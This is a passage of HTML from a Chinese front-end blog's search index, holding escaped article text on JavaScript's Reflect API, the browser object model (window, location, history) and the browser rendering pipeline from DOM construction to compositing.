&lt;li&gt;Reflect.getPrototypeOf(target)&lt;/li&gt;
&lt;li&gt;Reflect.setPrototypeOf(target, prototype)&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;reflectgettarget-name-receiver&#34;&gt;Reflect.get(target, name, receiver)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Reflect.get&lt;/code&gt;方法查找并返回&lt;code&gt;target&lt;/code&gt;对象的&lt;code&gt;name&lt;/code&gt;属性，如果没有该属性，则返回&lt;code&gt;undefined&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myObject = {
  foo: 1,
  bar: 2,
  get baz() {
    return this.foo + this.bar;
  },
}

Reflect.get(myObject, &#39;foo&#39;) // 1
Reflect.get(myObject, &#39;bar&#39;) // 2
Reflect.get(myObject, &#39;baz&#39;) // 3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果&lt;code&gt;name&lt;/code&gt;属性部署了读取函数（getter），则读取函数的&lt;code&gt;this&lt;/code&gt;绑定&lt;code&gt;receiver&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myObject = {
  foo: 1,
  bar: 2,
  get baz() {
    return this.foo + this.bar;
  },
};

var myReceiverObject = {
  foo: 4,
  bar: 4,
};

Reflect.get(myObject, &#39;baz&#39;, myReceiverObject) // 8
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;reflectsettarget-name-value-receiver&#34;&gt;Reflect.set(target, name, value, receiver)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Reflect.set&lt;/code&gt;方法设置&lt;code&gt;target&lt;/code&gt;对象的&lt;code&gt;name&lt;/code&gt;属性等于&lt;code&gt;value&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myObject = {
  foo: 1,
  set bar(value) {
    return this.foo = value;
  },
}

myObject.foo // 1

Reflect.set(myObject, &#39;foo&#39;, 2);
myObject.foo // 2

Reflect.set(myObject, &#39;bar&#39;, 3)
myObject.foo // 3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果&lt;code&gt;name&lt;/code&gt;属性设置了赋值函数，则赋值函数的&lt;code&gt;this&lt;/code&gt;绑定&lt;code&gt;receiver&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myObject = {
  foo: 4,
  set bar(value) {
    return this.foo = value;
  },
};

var myReceiverObject = {
  foo: 0,
};

Reflect.set(myObject, &#39;bar&#39;, 1, myReceiverObject);
myObject.foo // 4
myReceiverObject.foo // 1
&lt;/code&gt;&lt;/pre&gt;
">Proxy</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/bom/"" data-c="
          &lt;h2 id=&#34;window-对象&#34;&gt;window 对象&lt;/h2&gt;
&lt;p&gt;BOM 的核心对象是 window，&lt;/p&gt;
&lt;p&gt;在浏览器中，window 对象有双重角色， 它既是通过 JavaScript 访问浏览器窗口的一个接口，又是 ECMAScript 规定的 Global 对象。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;全局作用域&#34;&gt;全局作用域&lt;/h3&gt;
&lt;p&gt;window 对象同时扮演着 ECMAScript 中 Global 对象的角色，因此所有在全局作用域中声明 的变量、函数都会变成 window 对象的属性和方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var age = 29; 
function sayAge(){ 
 alert(this.age); 
} 

alert(window.age); //29 
sayAge(); //29 
window.sayAge(); //29
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于&lt;code&gt;sayAge()&lt;/code&gt;存在于全局作用域中，因此 this.age 被映射到 window.age&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;定义全局变量与在 window 对象上直接定义属性还 是有一点差别&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;全局变量不能通过 delete 操作符删除，而直接在 window 对象上的定义的属性可以&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var age = 29; 
window.color = &amp;quot;red&amp;quot;; 

//在 IE &amp;lt; 9 时抛出错误，在其他所有浏览器中都返回 false 
delete window.age; 

//在 IE &amp;lt; 9 时抛出错误，在其他所有浏览器中都返回 true 
delete window.color; //returns true 

alert(window.age); //29 
alert(window.color); //undefined 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为刚才使用 var 语句添加的 window 属性有一个名为[[Configurable]]的特性，这个特性的值被 设置为false，因此这样定义的属性不可以通过delete操作符删除。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;尝试访问未声明的变量会抛出错误，但是通过查询 window 对象，可以知 道某个可能未声明的变量是否存在&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//这里会抛出错误，因为 oldValue 未定义
var newValue = oldValue; 

//这里不会抛出错误，因为这是一次属性查询
//newValue 的值是 undefined 
var newValue = window.oldValue; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;窗口关系及框架&#34;&gt;窗口关系及框架&lt;/h3&gt;
&lt;p&gt;每个框架都拥有自己的 window 对象，并且保存在 frames 集合中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt; 
 &amp;lt;head&amp;gt; 
 &amp;lt;title&amp;gt;Frameset Example&amp;lt;/title&amp;gt; 
 &amp;lt;/head&amp;gt; 
 &amp;lt;frameset rows=&amp;quot;160,*&amp;quot;&amp;gt; 
 &amp;lt;frame src=&amp;quot;frame.htm&amp;quot; name=&amp;quot;topFrame&amp;quot;&amp;gt; 
 &amp;lt;frameset cols=&amp;quot;50%,50%&amp;quot;&amp;gt; 
 &amp;lt;frame src=&amp;quot;anotherframe.htm&amp;quot; name=&amp;quot;leftFrame&amp;quot;&amp;gt; 
 &amp;lt;frame src=&amp;quot;yetanotherframe.htm&amp;quot; name=&amp;quot;rightFrame&amp;quot;&amp;gt; 
 &amp;lt;/frameset&amp;gt; 
 &amp;lt;/frameset&amp;gt; 
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问框架方式&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628146461601.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h3 id=&#34;窗口位置&#34;&gt;窗口位置&lt;/h3&gt;
&lt;p&gt;用来确定和修改 window 对象位置，IE、Safari、Opera 和 Chrome 都提供了 &lt;code&gt;screenLeft&lt;/code&gt;和 &lt;code&gt;screenTop&lt;/code&gt;属性，分别用于表示窗口相对于屏幕左边和上边的位置&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;窗口大小&#34;&gt;窗口大小&lt;/h3&gt;
&lt;p&gt;多个属性：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;innerWidth&lt;/code&gt;、&lt;code&gt;innerHeight&lt;/code&gt; 表示当前视窗（viewport）的宽度和高度&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;outerWidth&lt;/code&gt;、&lt;code&gt;outerHeight&lt;/code&gt;返回浏览器窗口本身的尺寸（无论是从最外层的 window 对象还是从 某个框架访问）&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;clientWidth&lt;/code&gt;、&lt;code&gt;clientHeight&lt;/code&gt; ：width+左右padding、height + 上下padding&lt;/p&gt;
&lt;p&gt;&lt;code&gt;clientTop&lt;/code&gt;：boder.top(上边框的宽度)&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1628682665244.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;offsetWidth&lt;/code&gt; 、&lt;code&gt;offsetHeight&lt;/code&gt;：width + 左右padding + 左右boder、height + 上下padding +上下boder&lt;/p&gt;
&lt;p&gt;&lt;code&gt;offsetTop&lt;/code&gt; 当前元素 上边框 外边缘 到 最近的已定位父级（offsetParent） 上边框 内边缘的 距离&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628682633591.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scrollWidth&lt;/code&gt;、&lt;code&gt;scrollHeight&lt;/code&gt;：width&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scrollTop&lt;/code&gt;：:内容层顶部 到 可视区域顶部的距离  (用的最多)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628682684757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;p&gt;resizeTo()和 resizeBy()方法可以调整浏览器窗口的大小&lt;/p&gt;
&lt;p&gt;resizeTo()接收浏览器窗口的新宽度和新高度&lt;/p&gt;
&lt;p&gt;resizeBy()接收新窗口与原窗口的宽 度和高度之差&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//调整到 100×100 
window.resizeTo(100, 100); 

//调整到 200×150 
window.resizeBy(100, 50); 

//调整到 300×300 
window.resizeTo(300, 300); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;导航和打开窗口&#34;&gt;导航和打开窗口&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;window.open()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接收 4 个参数：要加载的 URL、窗口目标、一个特性字符串以及一个表示新页面是否取代浏览 器历史记录中当前加载页面的布尔值。&lt;/p&gt;
&lt;p&gt;如果第二个参数是已有窗口或框架的名称，那么就会在具 有该名称的窗口或框架中加载第一个参数指定的 URL。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//等同于&amp;lt; a href=&amp;quot;http://www.wrox.com&amp;quot; target=&amp;quot;topFrame&amp;quot;&amp;gt;&amp;lt;/a&amp;gt; 
window.open(&amp;quot;http://www.wrox.com/&amp;quot;, &amp;quot;topFrame&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;弹出窗口&#34;&gt;弹出窗口&lt;/h4&gt;
&lt;p&gt;如果给 window.open()传递的第二个参数并不是一个已经存在的窗口或框架，那么该方法就会根 据在第三个参数位置上传入的字符串创建一个新窗口或新标签页。&lt;/p&gt;
&lt;p&gt;调用 close()方法还可以关闭新打开的窗口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wroxWin.close()&lt;/code&gt; 、&lt;code&gt;Window.close()&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;location对象&#34;&gt;location对象&lt;/h2&gt;
&lt;p&gt;它提供了与当前窗口中加载的文档有关的信息，还提供了一 些导航功能&lt;/p&gt;
&lt;p&gt;下表列出了 location 对象的所有属性&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628146473852.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&#34;位置操作&#34;&gt;位置操作&lt;/h3&gt;
&lt;p&gt;使用 location 对象可以通过很多方式来改变浏览器的位置。&lt;/p&gt;
&lt;p&gt;使用 assign()方法并为其传递一个 URL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;location.assign(&amp;quot;http://www.wrox.com&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以立即打开新 URL 并在浏览器的历史记录中生成一条记录&lt;/p&gt;
&lt;p&gt;下列两行代码与 显式调用 assign()方法的效果完全一样。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;window.location = &amp;quot;http://www.wrox.com&amp;quot;; 
location.href = &amp;quot;http://www.wrox.com&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;replace()&lt;/code&gt;方法不会在浏览器上留痕，不会在历史记录中生成新记 录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;location.replace(&amp;quot;http://www.wrox.com/&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;reload()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;默认先从缓存找&lt;/p&gt;
&lt;p&gt;作用是重新加载当前显示的页面，如果要强制从服务器重新加载传参&lt;code&gt;location.reload(true)&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;history-对象&#34;&gt;history 对象&lt;/h2&gt;
&lt;p&gt;history 对象保存着用户上网的历史记录&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;go()&lt;/code&gt;方法可以在用户的历史记录中任意跳转，可以向后也可以向前。&lt;/p&gt;
&lt;p&gt;还可以使用两个简写方法 &lt;code&gt;back()&lt;/code&gt;和 &lt;code&gt;forward()&lt;/code&gt;来代替 &lt;code&gt;go()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个方法接受一个参数， 表示向后或向前跳转的页面数的一个整数值。负数表示向后跳转，正数反之&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//后退一页
history.go(-1); 

//前进一页
history.go(1); 

//前进两页
history.go(2); 


//跳转到最近的 wrox.com 页面
//如果历史记录中不包含该字符串，那么这个方法什么也不做
history.go(&amp;quot;wrox.com&amp;quot;); 

//后退一页
history.back(); 

//前进一页
history.forward(); 


&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;history 对象还有一个 length 属性，保存着历史记录的数量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (history.length == 0){ 
 //这应该是用户打开窗口后的第一个页面
} 

&lt;/code&gt;&lt;/pre&gt;
">BOM</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/htmlcss-he-javascriptshi-ru-he-bian-cheng-de/"" data-c="
          &lt;p&gt;导航被提交后就进⼊了渲染阶段。&lt;/p&gt;
&lt;h2 id=&#34;构建dom树&#34;&gt;构建DOM树&lt;/h2&gt;
&lt;p&gt;为什么要构建DOM树呢？&lt;/p&gt;
&lt;p&gt;这是因为浏览器⽆法直接理解和使⽤HTML，所以需要将HTML转换为 浏览器能够理解的结构——&lt;strong&gt;DOM树&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084109723.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;样式计算&#34;&gt;样式计算&lt;/h2&gt;
&lt;p&gt;样式计算的⽬的是为了计算出DOM节点中每个元素的具体样式&lt;/p&gt;
&lt;h3 id=&#34;把css转换为浏览器能够理解的结构&#34;&gt;把CSS转换为浏览器能够理解的结构&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084117590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;CSS样式来源主要有上面三种&lt;/p&gt;
&lt;p&gt;浏览器也是⽆法直接理解这些纯⽂本的CSS样式，所以当渲染引擎接收到 CSS⽂本时，会执⾏⼀个转换操作，&lt;strong&gt;将CSS⽂本转换为浏览器可以理解的结构—— styleSheets&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;只需要在控制台中输⼊ document.styleSheets，然后就看到如下图所⽰的结构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084131779.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;)&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;转换样式表中的属性值使其标准化&#34;&gt;转换样式表中的属性值，使其标准化&lt;/h3&gt;
&lt;p&gt;接下来就要对其进⾏属性值的标准化操作&lt;/p&gt;
&lt;p&gt;的CSS⽂本中有很多属性值，如2em、blue、bold，这些类型数值不容易被渲染引 擎理解，所以需要&lt;strong&gt;将所有值转换为渲染引擎容易理解的、标准化的计算值&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084154198.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h3 id=&#34;计算出dom树中每个节点的具体样式&#34;&gt;计算出DOM树中每个节点的具体样式&lt;/h3&gt;
&lt;p&gt;样式计算过程中的第一个规则是CSS继承。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CSS继承就是每个DOM节点都包含有⽗节点的样式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;样式计算过程中的第⼆个规则是样式层叠。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;层叠是CSS的⼀个基本特征，它是⼀个定义了如何合 并来⾃多个源的属性值的算法。它在CSS处于核⼼地位，CSS的全称“层叠样式表”正是强调了这 ⼀点&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这个阶段最终输出的内容是每个DOM节点的样式，并被保存 在ComputedStyle的结构内。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;布局阶段&#34;&gt;布局阶段&lt;/h2&gt;
&lt;p&gt;接下来就需要&lt;strong&gt;计算出DOM树中可⻅元素的⼏何位置&lt;/strong&gt;，我们把这个计 算过程叫做布局。&lt;/p&gt;
&lt;h3 id=&#34;创建布局树&#34;&gt;创建布局树&lt;/h3&gt;
&lt;p&gt;在显⽰之前，我们还要额外地构建⼀棵只包含可⻅元素布局树&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084173184.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;从上图可以看出，DOM树中所有不可⻅的节点都没有包含到布局树中&lt;/p&gt;
&lt;p&gt;为了构建布局树，浏览器⼤体上完成了下⾯这些⼯作：&lt;/p&gt;
&lt;p&gt;为了构建布局树，浏览器⼤体上完成了下⾯这些⼯作：&lt;/p&gt;
&lt;p&gt;⽽不可⻅的节点会被布局树忽略掉，如head标签下⾯的全部内容，再⽐如body.p.span这个元 素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;布局计算&#34;&gt;布局计算&lt;/h3&gt;
&lt;p&gt;接下来，就计算布局树节点的坐标位置&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;分层&#34;&gt;分层&lt;/h2&gt;
&lt;p&gt;现在我们有了布局树，因为⻚⾯中有很多复杂的效果，如⼀些复杂的3D变换、⻚⾯滚动，或者使⽤z-indexing做z轴排序等，为了 更加⽅便地实现这些效果，&lt;strong&gt;渲染引擎还需要为特定的节点⽣成专⽤的图层，并⽣成⼀棵对应的图层树&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;浏览器的⻚⾯实际上被分成了很多图层，这些图层叠加后合成了最终的⻚⾯&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084183718.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;浏览器的⻚⾯实际上被分成了很多图层，这些图层叠加后合成了最终的⻚⾯&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;但并不是布局树的每个节点都包含⼀个图层，如果⼀个节点没有对应的层，那么这个节点就从属 于⽗节点的图层。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;那么需要满⾜什么条件，渲染引擎才会为特定的节点创建新的层呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼀点，拥有层叠上下⽂属性的元素会被提升为单独的⼀层。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084191361.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;第⼆点，需要剪裁（clip）的地⽅也会被创建为图层。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;style&amp;gt;
div {
width: 200;
height: 200;
overflow:auto;
background: gray;
}
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div &amp;gt;
&amp;lt;p&amp;gt;所以元素有了层叠上下⽂的属性或者需要被剪裁，那么就会被提升成为单独⼀层，你可以参看下图：&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;从上图我们可以看到，document层上有A和B层，⽽B层之上⼜有两个图层。这些图层组织在⼀起也是⼀颗树状结构。&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这⾥我们把div的⼤⼩限定为200 * 200像素，⽽div⾥⾯的⽂字内容⽐较多，⽂字所显⽰的区域肯定会超出 200 * 200的⾯积，这时候就产⽣了剪裁&lt;/p&gt;
&lt;p&gt;出现这种裁剪情况的时候，渲染引擎会为⽂字部分单独创建⼀个层，如果出现滚动条，滚动条也会被提升为 单独的层。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084201544.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;图层绘制&#34;&gt;图层绘制&lt;/h2&gt;
&lt;p&gt;在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进⾏绘制&lt;/p&gt;
&lt;p&gt;渲染引擎实现图层的绘制与之类似，会把⼀个图层的绘制拆分成很多⼩的绘制指令，然后再把这些指令按照 顺序组成⼀个待绘制列表，如下图所⽰：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084215184.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;栅格化raster操作&#34;&gt;栅格化（raster）操作&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084222127.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程&lt;/p&gt;
&lt;p&gt;我们把⽤⼾可以看到的这个部分叫做&lt;strong&gt;视⼝&lt;/strong&gt; （viewport）。&lt;/p&gt;
&lt;p&gt;有的图层可以很⼤，⽐如有的⻚⾯你使⽤滚动条要滚动好久才能滚动到底部，但是通过视 ⼝，⽤⼾只能看到⻚⾯的很⼩⼀部分，所以在这种情况下，要绘制出所有图层内容的话，就会产⽣太⼤的开 销，⽽且也没有必要。&lt;/p&gt;
&lt;p&gt;基于这个原因，&lt;strong&gt;合成线程会将图层划分为图块&lt;/strong&gt;（tile）&lt;/p&gt;
&lt;p&gt;合成线程会按照视⼝附近的图块来优先⽣成位图，实际⽣成位图的操作是由栅格化来执⾏的。所谓栅格 化，是指将图块转换为位图。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;合成和显示&#34;&gt;合成和显⽰&lt;/h2&gt;
&lt;p&gt;⼀旦所有图块都被光栅化，合成线程就会⽣成⼀个绘制图块的命令⸺“DrawQuad”，然后将该命令提交 给浏览器进程。&lt;/p&gt;
&lt;p&gt;到这⾥，经过这⼀系列的阶段，编写好的HTML、CSS、JavaScript等⽂件，经过浏览器就会显⽰出漂亮的 ⻚⾯了。&lt;/p&gt;
&lt;p&gt;整个渲染流程：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084239640.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;⼀个完整的渲染流程⼤致可总结为如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;渲染进程将HTML内容转换为能够读懂的DOM树结构。&lt;/li&gt;
&lt;li&gt;渲染引擎将CSS样式表转化为浏览器可以理解的styleSheets，计算出DOM节点的样式。&lt;/li&gt;
&lt;li&gt;创建布局树，并计算元素的布局信息。&lt;/li&gt;
&lt;li&gt;对布局树进⾏分层，并⽣成分层树。&lt;/li&gt;
&lt;li&gt;为每个图层⽣成绘制列表，并将其提交到合成线程。&lt;/li&gt;
&lt;li&gt;合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。&lt;/li&gt;
&lt;li&gt;合成线程发送绘制图块命令DrawQuad给浏览器进程。&lt;/li&gt;
&lt;li&gt;浏览器进程根据DrawQuad消息⽣成⻚⾯，并显⽰到显⽰器上。&lt;/li&gt;
&lt;/ol&gt;
&lt;br&gt;
&lt;h2 id=&#34;相关概念&#34;&gt;相关概念&lt;/h2&gt;
&lt;h3 id=&#34;更新了元素的几何属性重排&#34;&gt;更新了元素的⼏何属性（重排）&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084287094.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如果你通过JavaScript或者CSS修改元素的⼏何位置属性，例如改变元素的宽度、⾼度 等，那么浏览器会触发重新布局，解析之后的⼀系列⼦阶段，这个过程就叫&lt;strong&gt;重排&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;重排需要更新完整 的渲染流⽔线，所以开销也是最⼤的。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;更新元素的绘制属性重绘&#34;&gt;更新元素的绘制属性（重绘）&lt;/h3&gt;
&lt;p&gt;⽐如通过JavaScript更改某些元素的背景颜⾊&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084293505.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如果修改了元素的背景颜⾊，那么布局阶段将不会被执⾏，因为并没有引起⼏何位置的变 换，所以就直接进⼊了绘制阶段，然后执⾏之后的⼀系列⼦阶段，这个过程就叫&lt;strong&gt;重绘&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重绘省去了布局和分层阶段，所以执⾏效率会⽐重排操作要⾼⼀些。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;直接合成阶段&#34;&gt;直接合成阶段&lt;/h3&gt;
&lt;p&gt;如果你更改⼀个既不要布局也不要绘制的属性，渲染引擎将跳过布局和绘制，只执⾏ 后续的合成操作，我们把这个过程叫做&lt;strong&gt;合成&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628084297971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;因为是在⾮主线程上合成，并没有占⽤主线程的资源，另外也避 开了布局和绘制两个⼦阶段，所以相对于重绘和重排，&lt;strong&gt;合成能⼤⼤提升绘制效率&lt;/strong&gt;。&lt;/p&gt;
">HTML、CSS和JavaScript，是如何变成⻚⾯的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/mian-xiang-dui-xiang-de-cheng-xu-she-ji/"" data-c="
          &lt;h2 id=&#34;对象&#34;&gt;对象&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;var person = new Object();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var person={}&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;属性类型&#34;&gt;属性类型&lt;/h3&gt;
&lt;h4 id=&#34;数据类型&#34;&gt;数据类型&lt;/h4&gt;
&lt;p&gt;[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特 性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的 这个特性默认值为 true。&lt;/p&gt;
&lt;p&gt;[[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定 义的属性，它们的这个特性默认值为 true。&lt;/p&gt;
&lt;p&gt;[[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的 这个特性默认值为 true。&lt;/p&gt;
